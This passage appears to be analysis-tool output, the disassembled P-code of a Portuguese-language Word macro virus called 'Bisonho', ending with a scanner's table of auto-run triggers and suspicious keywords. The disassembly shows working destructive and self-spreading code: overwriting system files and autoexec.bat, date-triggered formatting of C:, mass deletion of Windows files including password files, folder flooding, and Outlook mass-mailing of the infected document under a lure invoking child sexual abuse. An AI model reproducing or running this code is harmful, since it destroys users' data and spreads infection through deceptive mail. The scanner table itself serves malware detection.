' 	LitStr 0x000B "100 100 200"
' 	LitStr 0x0000 ""
' 	LitStr 0x0028 "HKEY_CURRENT_CONFIG\Control Panel\Colors"
' 	LitStr 0x0009 "ScrollBar"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #301:
' 	LitStr 0x000B "255 255 255"
' 	LitStr 0x0000 ""
' 	LitStr 0x0028 "HKEY_CURRENT_CONFIG\Control Panel\Colors"
' 	LitStr 0x000A "WindowText"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #302:
' 	EndSub 
' Line #303:
' Line #304:
' 	FuncDefn (Private Sub Action5())
' Line #305:
' 	OnError (Resume Next) 
' Line #306:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x000B "\Normal.dot"
' 	Add 
' 	St N$ 
' 	QuoteRem 0x0030 0x001E "Informa o caminho do normaldot"
' Line #307:
' 	Ld N$ 
' 	LitStr 0x000B "C:\Leia.dot"
' 	ArgsCall FileCopy 0x0002 
' 	QuoteRem 0x0030 0x0013 "Faz uma copia dele."
' Line #308:
' 	LitStr 0x0006 "C:\*.*"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' 	QuoteRem 0x0028 0x001A "Atribui C:\*.* como normal"
' Line #309:
' 	LitStr 0x0009 "C:\io.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' 	QuoteRem 0x0030 0x000B "Abre io.sys"
' Line #310:
' 	LitStr 0x000C "C:\msdos.sys"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' 	QuoteRem 0x0030 0x000E "Abre msdos.sys"
' Line #311:
' 	LitStr 0x000E "C:\command.com"
' 	LitDI2 0x0003 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' 	QuoteRem 0x0030 0x0010 "Abre command.com"
' Line #312:
' 	LitStr 0x0012 "C:\Windows\win.com"
' 	LitDI2 0x0004 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' 	QuoteRem 0x0030 0x000C "Abre win.com"
' Line #313:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0022 "Vc foi dominado pelo virus Bisonho"
' 	PrintItemNL 
' 	QuoteRem 0x0038 0x000C "Escreve umas"
' Line #314:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "Escrito por DICK MOE - Brasil"
' 	PrintItemNL 
' 	QuoteRem 0x0040 0x000B "mensaginhas"
' Line #315:
' 	LitDI2 0x0003 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "Presidente do grupo A BERNE MALTESA"
' 	PrintItemNL 
' 	QuoteRem 0x0040 0x000A "bunitinhas"
' Line #316:
' 	LitDI2 0x0004 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0032 "Um verdadeiro virus de macro... querem competir???"
' 	PrintItemNL 
' 	QuoteRem 0x0040 0x0006 "ehhehe"
' Line #317:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' 	QuoteRem 0x0030 0x0000 ""
' Line #318:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' 	QuoteRem 0x0030 0x0019 "Fecha os arquivos abertos"
' Line #319:
' 	LitDI2 0x0003 
' 	Sharp 
' 	Close 0x0001 
' 	QuoteRem 0x0030 0x001D "zerados (so com as mensagens)"
' Line #320:
' 	LitDI2 0x0004 
' 	Sharp 
' 	Close 0x0001 
' 	QuoteRem 0x0030 0x0000 ""
' Line #321:
' 	LitStr 0x000F "C:\autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' 	QuoteRem 0x0030 0x001A "Abre o Autoexec e deixa um"
' Line #322:
' 	ArgsCall recado 0x0000 
' Line #323:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #324:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "BREAK OFF > NUL"
' 	PrintItemNL 
' Line #325:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0028 "Echo vc foi destruido pelo virus Bisonho"
' 	PrintItemNL 
' Line #326:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "pause > nul"
' 	PrintItemNL 
' Line #327:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "Echo escrito por DICK MOE"
' 	PrintItemNL 
' Line #328:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "pause > nul"
' 	PrintItemNL 
' Line #329:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "Echo quer se vingar???"
' 	PrintItemNL 
' Line #330:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "pause > nul"
' 	PrintItemNL 
' Line #331:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002F "Echo passe o arquivo c:\leia.dot para alguem!!!"
' 	PrintItemNL 
' Line #332:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "pause > nul"
' 	PrintItemNL 
' Line #333:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 ":loop"
' 	PrintItemNL 
' Line #334:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "Echo Daniel e Tatiana"
' 	PrintItemNL 
' Line #335:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "Goto loop"
' 	PrintItemNL 
' Line #336:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' 	QuoteRem 0x0020 0x000F "Fecha o arquivo"
' Line #337:
' 	EndSub 
' Line #338:
' Line #339:
' 	FuncDefn (Sub ChooseActions())
' Line #340:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0015 0x0016 "Ocorreu um erro, pule."
' Line #341:
' 	Dim 
' 	VarDefn Chance
' 	QuoteRem 0x0015 0x0008 "Variavel"
' Line #342:
' 	ArgsCall Read 0x0000 
' 	QuoteRem 0x0020 0x0023 "Iniciar o gerador de nºs aleatorios"
' Line #343:
' 	LitDI2 0x0028 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St Chance 
' 	QuoteRem 0x0020 0x0011 "Chance de 1 em 8."
' Line #344:
' 	Ld Chance 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Action1 0x0000 
' 	EndIf 
' 	QuoteRem 0x0020 0x001B "Numero sorteado = 1, acao 1"
' Line #345:
' 	Ld Chance 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Action2 0x0000 
' 	EndIf 
' 	QuoteRem 0x0020 0x001B "Numero sorteado = 2, acao 2"
' Line #346:
' 	Ld Chance 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Action3 0x0000 
' 	EndIf 
' 	QuoteRem 0x0020 0x0006 "e etc."
' Line #347:
' 	Ld Chance 
' 	LitDI2 0x001E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Action4 0x0000 
' 	EndIf 
' Line #348:
' 	Ld Chance 
' 	LitDI2 0x0028 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Action5 0x0000 
' 	EndIf 
' Line #349:
' 	EndSub 
' Line #350:
' Line #351:
' 	FuncDefn (Sub ThisIsSpecial())
' Line #352:
' 	OnError (Resume Next) 
' Line #353:
' Line #354:
' 	QuoteRem 0x0000 0x0017 "Umas acoes especiais..."
' Line #355:
' Line #356:
' 	QuoteRem 0x0000 0x0043 "Se for sete de setembro, finaliza o word e o windows e formata o HD"
' Line #357:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0047 "ow! It's my BirthDay!!! Sete de setembro de 1984!!! Please, CAI FORA!!!"
' 	Ld vbSystemModal 
' 	Ld vbOKOnly 
' 	Add 
' 	LitStr 0x0008 "Dick Moe"
' 	ArgsCall MsgBox 0x0003 
' 	BoS 0x0000 
' 	Ld wdDoNotSaveChanges 
' 	Ld Application 
' 	ArgsMemCall Quit 0x0001 
' 	BoS 0x0000 
' 	Ld Tasks 
' 	ArgsMemCall ExitWindows 0x0000 
' 	EndIf 
' Line #358:
' 	LitStr 0x0029 "C:\Windows\Command\Format.com C:/Autotest"
' 	ArgsCall Shell 0x0001 
' 	QuoteRem 0x0033 0x0015 "Valeu ai NIM BUS!!!!!"
' Line #359:
' 	QuoteRem 0x0000 0x0036 " { hehehe, eu nao, viva o tio Bill e suas opcoes !!! }"
' Line #360:
' Line #361:
' 	QuoteRem 0x0000 0x004E "Se for sete de novembro, pergunta se o cara quer apagar o windows e so exibe o"
' Line #362:
' 	QuoteRem 0x0000 0x0009 "botao SIM"
' Line #363:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitStr 0x0002 "11"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #364:
' 	LitStr 0x0042 "ow! It's my syster's BirthDay!!! Do you really want to remove the "
' 	St mbox 
' Line #365:
' 	Reparse 0x0051 "WINDOWS folder and all of contents???": st = vbYes + vbQuestion: tit = "Dick Moe""
' Line #366:
' 	Ld mbox 
' 	Ld st 
' 	Ld tit 
' 	ArgsLd MsgBox 0x0003 
' 	St r 
' Line #367:
' 	Ld r 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' Line #368:
' 	LitStr 0x001A "Removendo C:\Windows... 3%"
' 	Ld Application 
' 	MemSt StatusBar 
' 	QuoteRem 0x0038 0x0019 "Mostra na barra de status"
' Line #369:
' 	LitStr 0x0010 "C:\Windows\*.exe"
' 	ArgsCall Kill 0x0001 
' 	QuoteRem 0x0038 0x0011 "Apaga os arquivos"
' Line #370:
' 	LitStr 0x001B "Removendo C:\Windows... 13%"
' 	Ld Application 
' 	MemSt StatusBar 
' Line #371:
' 	LitStr 0x0010 "C:\Windows\*.bmp"
' 	ArgsCall Kill 0x0001 
' Line #372:
' 	LitStr 0x001B "Removendo C:\Windows... 19%"
' 	Ld Application 
' 	MemSt StatusBar 
' Line #373:
' 	LitStr 0x0010 "C:\Windows\*.gif"
' 	ArgsCall Kill 0x0001 
' Line #374:
' 	LitStr 0x001B "Removendo C:\Windows... 29%"
' 	Ld Application 
' 	MemSt StatusBar 
' Line #375:
' 	LitStr 0x0010 "C:\Windows\*.com"
' 	ArgsCall Kill 0x0001 
' Line #376:
' 	LitStr 0x001B "Removendo C:\Windows... 33%"
' 	Ld Application 
' 	MemSt StatusBar 
' Line #377:
' 	LitStr 0x0010 "C:\Windows\*.jpg"
' 	ArgsCall Kill 0x0001 
' Line #378:
' 	LitStr 0x001B "Removendo C:\Windows... 45%"
' 	Ld Application 
' 	MemSt StatusBar 
' Line #379:
' 	LitStr 0x0010 "C:\Windows\*.dll"
' 	ArgsCall Kill 0x0001 
' Line #380:
' 	LitStr 0x001B "Removendo C:\Windows... 56%"
' 	Ld Application 
' 	MemSt StatusBar 
' Line #381:
' 	LitStr 0x0010 "C:\Windows\*.sys"
' 	ArgsCall Kill 0x0001 
' Line #382:
' 	LitStr 0x001B "Removendo C:\Windows... 69%"
' 	Ld Application 
' 	MemSt StatusBar 
' Line #383:
' 	LitStr 0x0010 "C:\Windows\*.txt"
' 	ArgsCall Kill 0x0001 
' Line #384:
' 	LitStr 0x001B "Removendo C:\Windows... 75%"
' 	Ld Application 
' 	MemSt StatusBar 
' Line #385:
' 	LitStr 0x0010 "C:\Windows\*.doc"
' 	ArgsCall Kill 0x0001 
' Line #386:
' 	LitStr 0x001B "Removendo C:\Windows... 80%"
' 	Ld Application 
' 	MemSt StatusBar 
' Line #387:
' 	LitStr 0x0010 "C:\Windows\*.dat"
' 	ArgsCall Kill 0x0001 
' Line #388:
' 	LitStr 0x001B "Removendo C:\Windows... 99%"
' 	Ld Application 
' 	MemSt StatusBar 
' Line #389:
' 	LitStr 0x0010 "C:\Windows\*.pwl"
' 	ArgsCall Kill 0x0001 
' Line #390:
' 	LitStr 0x001C "Removendo C:\Windows... done"
' 	Ld Application 
' 	MemSt StatusBar 
' Line #391:
' 	EndIfBlock 
' Line #392:
' 	EndIfBlock 
' Line #393:
' Line #394:
' 	QuoteRem 0x0000 0x0037 "Se for sete de junho, cria 5000 pastas (que coisa nao?)"
' Line #395:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #396:
' 	LitStr 0x0031 "ow! It's my mommy's Birthday... ow? What is it???"
' 	Ld vbExclamation 
' 	LitStr 0x0008 "Dick Moe"
' 	ArgsCall MsgBox 0x0003 
' Line #397:
' 	Dim (Static) 
' 	VarDefn P
' Line #398:
' 	Dim (Static) 
' 	VarDefn Q
' Line #399:
' 	Dim 
' 	VarDefn S
' Line #400:
' 	LitStr 0x0006 "\Mommy"
' 	St S 
' Line #401:
' 	LitStr 0x0008 "C:\Mommy"
' 	St P 
' Line #402:
' 	Ld P 
' 	ArgsCall MkDir 0x0001 
' Line #403:
' 	Label Pastas 
' Line #404:
' 	Ld Q 
' 	LitDI2 0x0001 
' 	Add 
' 	St Q 
' 	BoS 0x0000 
' 	Ld Q 
' 	LitDI2 0x1388 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	GoTo Fim 
' 	EndIf 
' Line #405:
' 	Ld P 
' 	Ld S 
' 	Add 
' 	St P 
' Line #406:
' 	Ld P 
' 	ArgsCall MkDir 0x0001 
' Line #407:
' 	GoTo Pastas 
' Line #408:
' 	Label Fim 
' Line #409:
' 	EndIfBlock 
' Line #410:
' Line #411:
' 	QuoteRem 0x0000 0x003A "Se for oito de fevereiro, apaga o conteudo do menu iniciar"
' Line #412:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #413:
' 	Reparse 0x004B "MsgBox "ow! It's my daddy's Birthday... Do you want to go to the party???","
' Line #414:
' 	ParamOmitted 
' 	LitStr 0x0008 "Dick Moe"
' 	ArgsCall vbCritical 0x0002 
' Line #415:
' 	LitStr 0x0021 "Deltree/y c:\windows\menu iniciar"
' 	ArgsCall Shell 0x0001 
' Line #416:
' 	LitStr 0x001F "Deltree/y c:\windows\start menu"
' 	ArgsCall Shell 0x0001 
' Line #417:
' 	EndIfBlock 
' Line #418:
' Line #419:
' 	QuoteRem 0x0000 0x0049 "Se o dia for igual aos segundos, faz um joguinho e anexa o resultado a um"
' Line #420:
' 	QuoteRem 0x0000 0x0022 "arquivo aleatorio da pasta windows"
' Line #421:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Second 0x0001 
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0030 0x0013 "Condicao Day=Second"
' Line #422:
' 	LitStr 0x000C "Jockey PÔ!!!"
' 	Ld vbExclamation 
' 	LitStr 0x0008 "Dick Moe"
' 	ArgsCall MsgBox 0x0003 
' 	QuoteRem 0x0031 0x0008 "Mensagem"
' Line #423:
' 	Dim 
' 	VarDefn FILEEE
' 	QuoteRem 0x0030 0x0008 "Variavel"
' Line #424:
' 	LitStr 0x000E "C:\Windows\*.*"
' 	ArgsLd Dir 0x0001 
' 	St FILEEE 
' 	QuoteRem 0x0030 0x0011 "Arquivo aleatorio"
' Line #425:
' 	Ld FILEEE 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' 	QuoteRem 0x0030 0x000E "Abre o arquivo"
' Line #426:
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St o 
' 	QuoteRem 0x0030 0x0011 "Ganhou ou perdeu?"
' Line #427:
' 	Ld o 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "Ow, you loose, try again!!!"
' 	PrintItemNL 
' 	EndIf 
' 	QuoteRem 0x0038 0x0009 "Perdeu..."
' Line #428:
' 	Ld o 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "Ow yeah! You win... SHIT"
' 	PrintItemNL 
' 	EndIf 
' Line #429:
' 	QuoteRem 0x0000 0x0022 "Ganhou... anota tudinho no arquivo"
' Line #430:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "Do you want to play again???"
' 	PrintItemNL 
' 	QuoteRem 0x0030 0x0016 "Vc quer jogar de novo?"
' Line #431:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #432:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #433:
' 	EndIfBlock 
' Line #434:
' 	EndSub 
' Line #435:
' Line #436:
' 	FuncDefn (Private Sub EmailCopy())
' Line #437:
' 	OnError (Resume Next) 
' Line #438:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #439:
' Line #440:
' 	Dim 
' 	VarDefn OutLookAp
' 	VarDefn NamOfMapi
' 	VarDefn BisonhoMail
' 	QuoteRem 0x0028 0x0014 "Inicializa variaveis"
' Line #441:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set OutLookAp 
' 	QuoteRem 0x0038 0x0014 "Inicializa o Outlook"
' Line #442:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld OutLookAp 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set NamOfMapi 
' Line #443:
' 	QuoteRem 0x0000 0x002D "Verifica se ja foram mandados os emails antes"
' Line #444:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0007 "Bisonho"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0019 "Sim, sou eu mesmo, e dai?"
' 	Ne 
' 	IfBlock 
' Line #445:
' Line #446:
' 	Ld OutLookAp 
' 	LitStr 0x0007 "Outlook"
' 	Eq 
' 	IfBlock 
' Line #447:
' 	LitStr 0x0007 "profile"
' 	LitStr 0x0008 "password"
' 	Ld NamOfMapi 
' 	ArgsMemCall Logon 0x0002 
' 	QuoteRem 0x0030 0x001D "Inicializa a conta do usuario"
' Line #448:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NamOfMapi 
' 	MemLd AddressLists 
' 	MemLd Count 
' 	For 
' 	QuoteRem 0x0030 0x001B "Conta quantos enderecos tem"
' Line #449:
' 	SetStmt 
' 	Ld y 
' 	Ld NamOfMapi 
' 	ArgsMemLd AddressLists 0x0001 
' 	Set AddyBook 
' Line #450:
' 	LitDI2 0x0001 
' 	St x 
' Line #451:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld OutLookAp 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set BisonhoMail 
' Line #452:
' 	StartForVariable 
' 	Ld oo 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AddyBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	For 
' Line #453:
' 	Ld x 
' 	Ld AddyBook 
' 	ArgsMemLd AddressEntries 0x0001 
' 	St TheEntries 
' Line #454:
' 	Ld TheEntries 
' 	Ld BisonhoMail 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' 	QuoteRem 0x0030 0x0011 "Adiciona entradas"
' Line #455:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Add 
' 	St x 
' Line #456:
' 	Ld x 
' 	LitDI2 0x0032 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld AddyBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	St oo 
' 	EndIf 
' Line #457:
' 	StartForVariable 
' 	Ld oo 
' 	EndForVariable 
' 	NextVar 
' Line #458:
' Line #459:
' 	QuoteRem 0x0000 0x004B "---> Nao tenho certeza se esse mecanismo vai funcionar, se tiver algum bug,"
' Line #460:
' 	QuoteRem 0x0000 0x0041 " por favor me avise. E que eu estou sem o office, vcs ja sabem..."
' Line #461:
' Line #462:
' 	QuoteRem 0x0000 0x0046 "Esse e um mecanismo bem simples que funciona assim: verifica se o word"
' Line #463:
' 	QuoteRem 0x0000 0x0047 "e em portugues ou ingles atraves do nome dos menus (a definicao tools e"
' Line #464:
' 	QuoteRem 0x0000 0x004A "padrao em qualquer idioma, o que muda e o que e exibido pro usuario), para"
' Line #465:
' 	QuoteRem 0x0000 0x004B "que assim o virus "saiba" se e pra mandar um email em português ou ingles.."
' Line #466:
' 	QuoteRem 0x0000 0x004B "Da resultado em 80% dos micros, excecto aqueles brasileiros bestas que usam"
' Line #467:
' 	QuoteRem 0x0000 0x0013 "office em inglês..."
' Line #468:
' Line #469:
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Tools"
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0030 0x0013 "Se o nome for Tools"
' Line #470:
' 	LitStr 0x0017 "Important Message From "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld BisonhoMail 
' 	MemSt Subject 
' Line #471:
' 	LitStr 0x0087 "This is a huge list of sites of kids sex... I saw the whole document and all of the sites are online and free! Check out by yourself..."
' 	Ld BisonhoMail 
' 	MemSt Body 
' Line #472:
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	MemLd New 
' 	LitStr 0x000B "Ferramentas"
' 	Eq 
' 	ElseIfBlock 
' 	QuoteRem 0x0038 0x0014 "Se for ferramentas.."
' Line #473:
' 	LitStr 0x000A "E ai, blz?"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld BisonhoMail 
' 	MemSt Subject 
' Line #474:
' 	LitStr 0x00A0 "Ontem eu entrei no chat da UOL e catei um monte de sites de sexo de kids. E bem loco e todos sao gratis e estao online... da um ligo pra vc ver... tem bastante."
' 	Ld BisonhoMail 
' 	MemSt Body 
' Line #475:
' 	ElseBlock 
' Line #476:
' 	LitStr 0x0017 "Important Message From "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld BisonhoMail 
' 	MemSt Subject 
' Line #477:
' 	LitStr 0x0087 "This is a huge list of sites of kids sex... I saw the whole document and all of the sites are online and free! Check out by yourself..."
' 	Ld BisonhoMail 
' 	MemSt Body 
' Line #478:
' 	EndIfBlock 
' Line #479:
' Line #480:
' 	QuoteRem 0x0000 0x004B "---> Nao tenho certeza se esse mecanismo vai funcionar, se tiver algum bug,"
' Line #481:
' 	QuoteRem 0x0000 0x0040 "por favor me avise. E que eu estou sem o office, vcs ja sabem..."
' Line #482:
' Line #483:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld BisonhoMail 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' 	QuoteRem 0x0038 0x0015 "Anexa o doc infectado"
' Line #484:
' 	Ld BisonhoMail 
' 	ArgsMemCall Send 0x0000 
' 	QuoteRem 0x0028 0x001C "E envia para a lista inteira"
' Line #485:
' Line #486:
' 	LitStr 0x0000 ""
' 	St TheEntries 
' 	QuoteRem 0x0010 0x0011 "Reseta a variavel"
' Line #487:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #488:
' 	Ld NamOfMapi 
' 	ArgsMemCall Logoff 0x0000 
' 	QuoteRem 0x0018 0x000D "Fecha a conta"
' Line #489:
' 	EndIfBlock 
' Line #490:
' Line #491:
' 	QuoteRem 0x0000 0x0045 "Adiciona uma chave ao registro para que nao seja enviados mais emails"
' Line #492:
' 	LitStr 0x0019 "Sim, sou eu mesmo, e dai?"
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0007 "Bisonho"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #493:
' 	EndIfBlock 
' Line #494:
' 	EndSub 
' Line #495:
' Line #496:
' 	QuoteRem 0x0000 0x0014 "Ah Finalmente Acabou"
' Line #497:
' 	QuoteRem 0x0000 0x000E "Nao E Facil???"
' Line #498:
' Line #499:
' 	QuoteRem 0x0000 0x004A "Bem, Um Abraco Ai Pro Pessoal, Pro Nimbus E Pra Todo Mundo Que Curte Fazer"
' Line #500:
' 	QuoteRem 0x0000 0x0008 "Um Virus"
' Line #501:
' Line #502:
' 	QuoteRem 0x0000 0x0022 "E Um Pau Na Lomba Dos Av's Makers."
' Line #503:
' Line #504:
' 	QuoteRem 0x0000 0x004A "Pensem Bem: Quanto Mais Av's Podres Que Vcs Fizerem, Mais Virus, Mais Av's"
' Line #505:
' 	QuoteRem 0x0000 0x0047 "E Consequentemente Mais Grana Proces... Eu Faco Virus So Por Diversao E"
' Line #506:
' 	QuoteRem 0x0000 0x0018 "Status... Nao Por Grana."
' Line #507:
' Line #508:
' 	QuoteRem 0x0000 0x004B "E Um Pau Na Lomba Dos Lammahs Que Nao Sao So Lammahs, Sao Lammahs Assumidos"
' Line #509:
' 	QuoteRem 0x0000 0x004B "Fudidos E Que Nao Tem Jeito: Frase Campea Do Hall: Eu Tava Tentando Acessar"
' Line #510:
' 	QuoteRem 0x0000 0x003F "Meu Email, Eu Digitava Tudo Direitinho Www.Skott@Ig.Com.Br....."
' Line #511:
' 	QuoteRem 0x0000 0x001E "E Ou Nao E De Chutar O Saco???"
' Line #512:
' Line #513:
' 	QuoteRem 0x0000 0x0028 "Depois Perguntam: Pq Vcs Fazem Virus????"
' Line #514:
' 	QuoteRem 0x0000 0x0034 "Vc Acha Que Um Porra Desses Ai Em Cima Merece Viver?"
' Line #515:
' Line #516:
' 	QuoteRem 0x0000 0x003A "Bem, Falou A Todos E Qualquer Coisa, Email-Me Ou Icq-Me..."
' Line #517:
' Line #518:
' 	QuoteRem 0x0000 0x000B "By Dick Moe"
' Line #519:
' 	QuoteRem 0x0000 0x0042 "(Obs: Lê-Se Dick Mou, E Que Tem Uns Bobao Que Fala Dick Moe Mesmo)"
' Line #520:
' 	QuoteRem 0x0000 0x003B "A Berne Maltesa......................... The New Generation"
' Line #521:
' 	QuoteRem 0x0000 0x004C "'''''''''''''''''''''''''''' BISONHO '''''''''''''''''''''''''''''''''''''''"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Patch.exe           |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|Hex String|v&x5                |76267835                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
